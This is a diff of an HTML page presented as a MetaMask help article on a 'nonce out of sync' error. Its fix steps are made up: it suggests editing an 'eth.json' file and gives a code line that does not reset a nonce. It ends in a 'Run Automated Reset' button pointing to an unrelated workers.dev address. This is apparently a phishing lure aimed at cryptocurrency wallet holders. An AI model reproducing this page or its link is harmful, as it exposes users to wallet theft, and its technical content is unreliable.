@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #121214;
+        font-family: system-ui;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,29 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum (ETH) network. This error prevents the transaction from being processed, indicating a discrepancy between the expected and actual nonce values.</li>
+<li>Users encounter an error message "MetaMask nonce out of sync" when attempting to send a transaction on the Ethereum network, indicating a discrepancy between the expected and actual nonce values.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain. This can happen when a transaction is sent but not confirmed, or if multiple transactions are sent in quick succession without waiting for the previous transaction to be confirmed.</li>
+<li>The error occurs due to a mismatch between the account nonce stored in MetaMask and the actual nonce on the Ethereum blockchain, often resulting from concurrent transactions or wallet resets.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in MetaMask to resync the nonce value:</li>
-<li>Delete the MetaMask extension and reinstall it</li>
-<li>Use the <code>eth_account</code> module in a bash terminal to reset the account nonce</li>
-<li>Update the <code>eth.json</code> configuration file with the correct nonce value, as shown in the following code block:</li>
+<li>Reset the account nonce in MetaMask to match the on-chain value:</li>
+<li>Update the MetaMask settings to reflect the correct nonce</li>
+<li>Use the Ethereum blockchain explorer to verify the correct nonce value</li>
+<li>Utilize the following code to reset the nonce:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;account&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;nonce&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>eth.accounts<span class="o">[</span><span class="m">0</span><span class="o">]</span>.nonce<span class="w"> </span><span class="o">=</span><span class="w"> </span>eth.getTransactionCount<span class="o">(</span>eth.accounts<span class="o">[</span><span class="m">0</span><span class="o">])</span>
 </code></pre></div>
 
 <p>Consider utilizing an external console for more complex transactions.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>MetaMask extension installed and configured</li>
+<li>Ethereum wallet with a sufficient balance</li>
+<li>Access to the Ethereum blockchain explorer (e.g., Etherscan)</li>
+</ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
